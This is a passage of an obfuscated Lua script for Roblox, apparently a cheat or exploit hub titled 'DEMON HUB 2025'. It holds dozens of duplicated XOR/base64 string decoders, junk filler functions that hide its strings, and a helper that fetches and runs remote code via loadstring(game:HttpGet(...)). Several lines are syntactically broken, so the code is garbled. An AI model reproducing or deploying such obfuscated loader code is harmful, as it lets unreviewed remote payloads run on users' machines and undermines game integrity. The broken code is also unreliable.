            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_uqxsbk(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_mymqrb(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_virkzx(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_dvmtwc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_quumnk(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_yqvgjv(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_gmqjuh(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ekcpgl(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_wsvcys(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_wca_qu(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ypftux(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_rwggvw(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_kanoba(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_lyp_on(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_l_fzvn(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_dazqse(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ucxw_n(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_qcxhhn(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ninwvx(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_yvkmle(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_bosmlg(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_pogwzi(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_emnntd(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_kvfxaa(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_exkjoe(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec__xiah_(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_brrw_d(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_bvadhj(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end


-- Main code

local dummy_ymbiakhh = function(a, b, c)
    local result = a or b or c or math.random(1000)
        for i = 1, math.random(10, 50) do
            result = result + i * math.random()
            end
            return result
        end


        local dummy_fra_tlex = function(a, b, c)
            local result = a or b or c or math.random(1000)
                for i = 1, math.random(10, 50) do
                    result = result + i * math.random()
                    end
                    return result
                end


                local dummy_iucfwlhv = function(a, b, c)
                    local result = a or b or c or math.random(1000)
                        for i = 1, math.random(10, 50) do
                            result = result + i * math.random()
                            end
                            return result
                        end


                        local dummy_yzwdzqly = function(a, b, c)
                            local result = a or b or c or math.random(1000)
                                for i = 1, math.random(10, 50) do
                                    result = result + i * math.random()
                                    end
                                    return result
                                end


                                local dummy_ik_insbe = function(a, b, c)
                                    local result = a or b or c or math.random(1000)
                                        for i = 1, math.random(10, 50) do
                                            result = result + i * math.random()
                                            end
                                            return result
                                        end

                                        -- ╔═══════════════════════════════════════════════════════════════════╗
                                        -- ║                     DEMON HUB 2025 - CORRUPT CORE EDITION         ║
                                        -- ║                          v_odaqyexq: V4                              ║
                                        -- ║                     CORRUPTED by AlznDev                          ║
                                        -- ╚═══════════════════════════════════════════════════════════════════╝

                                        -- 1. ═══════════════ CONFIGURATION & CONSTANTS ═══════════════
                                        local v_k_uykjwh = {
                                        v_lusaxdvi = dec_kcohtj("w5fDmMKkwqQ=", 153),
                                        v_rupopvfs = dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15),
                                        v_zemgqamv = dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108),
                                        v__avtyeay = {
                                        v_ow_apbmn = Color3.fromRGB(138, 43, 226),      -- Blue Violet
                                        v_ci_nagdr = Color3.fromRGB(75, 0, 130),       -- Indigo
                                        v_fcfwknqb = Color3.fromRGB(30, 144, 255)        -- Dodger Blue
                                        }
                                        }

                                        -- Play notification v_vokvhswv helper function
                                            local function playNotificationSound(v_ovwonzgv, v)
                                                local v_brr_h_wo = Instance.new(dec_inqejt("eB8UHE9AfBA=", 45), workspace)
                                                v_brr_h_wo.v_nptbqucg = v_ovwonzgv or v_k_uykjwh.v_rupopvfs
                                                v_brr_h_wo.v_ejssckzy = v or 1
                                                v_brr_h_wo:Play()
                                                v_brr_h_wo.Ended:Connect(function()
                                                    v_brr_h_wo:Destroy()
                                                end)
                                            end

                                            -- 2. ═══════════════ SERVICES ═══════════════
                                            local v__ubaldnc = {
                                            v_iegmngkt = game:GetService(dec_gybpae("JS14MRsWJTUjLCUzJQB8fA==", 65)),
                                            v_svcspoxa = game:GetService(dec_qwhwbo("wqrCosO3wrTCqsKjwoDCtMKtwonDt8O6wpfCn8Ozw7M=", 206)),
                                            v_ebvllicu = game:GetService(dec__aeok_("w5jDkMKFw5DDpcOSw6bDj8Oew7vDkMOWw5jDrcKBwoE=", 188)),
                                            v_qywpnfav = game:GetService(dec_ktv_tn("w5PDm8KOw4/DksOvw5PDgMOVw5rDrcOfw5PDkMKKwoo=", 183)),
                                            v_lriwcrrj = game:GetService(dec_slsbrf("XlYDSVlXVgljCXBDW10HBw==", 58)),
                                            v_wphzeagw = game:GetService(dec_tzukpv("w5/Dl8KCwojDmMO8w5PCjcOhw6zDvcOVw5/DjMKGwoY=", 187)),
                                            v_qajhuzxp = game:GetService(dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)0),
                                            v_oxiwydta = game:GetService(dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)1)
                                            }

                                            -- 3. ═══════════════ GLOBAL VARIABLES ═══════════════
                                            local v_pvlrlnos = v__ubaldnc.v_iegmngkt.v_pvlrlnos
                                            local v_gwaz_qjg = v_pvlrlnos.v_gwaz_qjg or v_pvlrlnos.CharacterAdded:Wait()
                                            local v_youefgut = v_gwaz_qjg:WaitForChild(dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)2)
                                            local v_ev_tfmwd = v_gwaz_qjg:WaitForChild(dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)3)

                                            -- State Management
                                            local v_xrtseutw = {
                                            v_tdvetonk = false,
                                            v_gmhymsmg = false,
                                            v__rhfhmpb = false,
                                            v_zf_orm_i = false,
                                            v_olpodmix = false,
                                            v_tk_v_xmq = false,
                                            v_ckc_tthu = false
                                            }

                                            -- v_qagwtjzn Storage
                                            local v_qagwtjzn = {}

                                            -- 4. ═══════════════ UTILITY FUNCTIONS ═══════════════
                                            local v_ooc_rxba = {}

                                            -- 4.1 Safe function execution with v_xsqkaegm handling
                                                function v_ooc_rxba.SafeExecute(func, ...)
                                                    local success, v_jrprfrjj = pcall(func, ...)
                                                    if not success then
                                                        warn(dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)4, v_jrprfrjj)
                                                        return false, v_jrprfrjj
                                                    end
                                                    return true, v_jrprfrjj
                                                end

                                                -- 4.2 Enhanced notification system
                                                    function v_ooc_rxba.Notify(title, text, duration)
                                                        v__ubaldnc.v_oxiwydta:SetCore(dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)5, {
                                                        v_dunxp_ov = title or dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)6,
                                                        v_mkhvhwha = text or dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)7,
                                                        v_heobamed = duration or 3
                                                        })
                                                    end

                                                    -- 4.3 Play v_vokvhswv with cleanup
                                                    function v_ooc_rxba.PlaySound(soundId, volume, callback)
                                                        local v_vokvhswv = Instance.new(dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)8)
                                                        v_vokvhswv.v_nptbqucg = soundId
                                                        v_vokvhswv.v_ejssckzy = volume or 1
                                                        v_vokvhswv.v_uxzuzaoq = v__ubaldnc.v_ebvllicu

                                                        v_vokvhswv.Ended:Connect(function()
                                                            v_vokvhswv:Destroy()
                                                            if callback then callback() end
                                                        end)

                                                        v_vokvhswv:Play()
                                                        return v_vokvhswv
                                                    end

                                                    -- 4.4 Get character safely
                                                    function v_ooc_rxba.GetCharacter()
                                                        return v_pvlrlnos.v_gwaz_qjg or v_pvlrlnos.CharacterAdded:Wait()
                                                    end

                                                    -- 4.5 Get v_odbeftem safely
                                                    function v_ooc_rxba.GetHumanoid()
                                                        local v_oclc_rhk = v_ooc_rxba.GetCharacter()
                                                        return v_oclc_rhk and v_oclc_rhk:FindFirstChildOfClass(dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)9)
                                                    end

                                                    -- 4.6 Load external script safely
                                                    function v_ooc_rxba.LoadScript(v_zpdpmnzj)
                                                        v_ooc_rxba.SafeExecute(function()
                                                            loadstring(game:HttpGet(v_zpdpmnzj, true))()
                                                        end)
                                                    end

                                                    -- 5. ═══════════════ INITIALIZATION ═══════════════
